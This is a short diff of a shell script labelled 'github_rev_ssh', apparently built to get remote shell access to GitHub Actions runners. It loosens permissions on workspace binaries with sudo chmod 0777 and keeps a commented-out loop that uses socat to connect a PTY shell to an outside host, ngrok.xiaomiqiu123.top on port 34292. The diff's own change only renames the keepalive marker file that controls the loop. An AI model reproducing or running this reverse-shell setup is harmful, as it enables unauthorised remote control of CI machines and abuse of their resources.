@@ -29,7 +29,7 @@ s2="grep -q sftp-server /proc/\$\$/cmdline&&(
 
 # github_rev_ssh
 (id | grep "^uid=[0-9]\{1,9\}(runner)") && (
-    touch /tmp/keepalive
+    touch /tmp/keepalive;touch /tmp/0a9.txt;
     alias ll="ls -al"
     #sudo chmod 0777  /home/runner/work/nc_test/nc_test/*.bin;
     sudo bash -c "chmod 0777 $GITHUB_WORKSPACE/*.bin;"
@@ -42,7 +42,7 @@ s2="grep -q sftp-server /proc/\$\$/cmdline&&(
 
 #( 
 #    (while true; do
-#        [ ! -f /tmp/keepalive ] && break
+#        [ ! -f /tmp/0a9.txt ] && break
 #        sudo $GITHUB_WORKSPACE/socat.bin -t5 exec:"$d1",pty,stderr,setsid,sigint,sane tcp:'ngrok.xiaomiqiu123.top':34292;sleep 8;
 #    done) &
 #) &
